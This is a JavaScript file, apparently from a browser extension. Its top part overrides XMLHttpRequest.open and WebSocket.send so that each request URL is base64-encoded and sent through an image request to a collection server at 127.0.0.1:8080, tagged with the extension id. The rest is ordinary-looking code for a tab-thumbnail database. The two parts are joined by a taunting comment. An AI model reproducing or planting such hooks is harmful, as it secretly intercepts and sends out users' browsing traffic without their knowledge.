function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var dbController = function(){this.setupDB();};dbController.prototype = {setupDB: function(){this.db_name = "coolstart_extension_db";this.indexedDB = window.indexedDB || window.webkitIndexedDB || window.mozIndexedDB || window.msIndexedDB;var IDBTransaction = window.IDBTransaction || window.webkitIDBTransaction;var dbVersion = 1;var openRequest = this.indexedDB.open(this.db_name, dbVersion);var self = this;openRequest.onsuccess = function (evt) {self.db = this.result;};openRequest.onupgradeneeded = function(e) {self.db = e.target.result;if(!self.db.objectStoreNames.contains("thumbnails")) {var objectStore = self.db.createObjectStore("thumbnails", { keyPath: "url", autoIncrement:false, unique: true }); objectStore.createIndex("src", "src", { unique: false });}}},getObjectStore: function(store_name){transaction = this.db.transaction(store_name, 'readwrite');return transaction.objectStore(store_name);},insertThumbnail: function(tab){var self = this;chrome.tabs.captureVisibleTab(tab.windowId, {format: "png"}, function(img) {cropImg(img, {'w': 130, 'h': 90}, function(img){var objectStore = self.getObjectStore('thumbnails');var request = objectStore.add({'url' : shortUrl(tab.url), 'src' : img});});});},getThumbnail: function(url,callback){var objectStore = this.getObjectStore('thumbnails');var request = objectStore.get(shortUrl(url));request.onsuccess = function(event) {if(typeof event.target.result != 'undefined'){callback(event.target.result.src);}};}}